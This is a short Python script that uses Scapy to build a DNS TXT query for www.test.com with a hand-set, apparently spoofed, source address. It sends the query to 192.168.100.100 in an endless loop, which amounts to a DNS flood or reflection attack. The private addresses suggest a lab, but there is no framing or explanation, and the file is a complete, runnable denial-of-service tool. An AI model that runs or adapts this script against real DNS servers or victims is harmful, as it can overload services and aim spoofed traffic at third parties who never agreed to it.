#!/usr/bin/env python
from scapy.all import *
a = IP(dst="192.168.100.100",src="192.168.100.222")
b = UDP(dport=53)
c = DNS(id=1,qr=0,opcode=0,tc=0,rd=1,qdcount=1,ancount=0,nscount=0,arcount=0)
c.qd=DNSQR(qname="www.test.com",qtype="TXT",qclass="IN")
p = a/b/c
while 1:
	send(p)
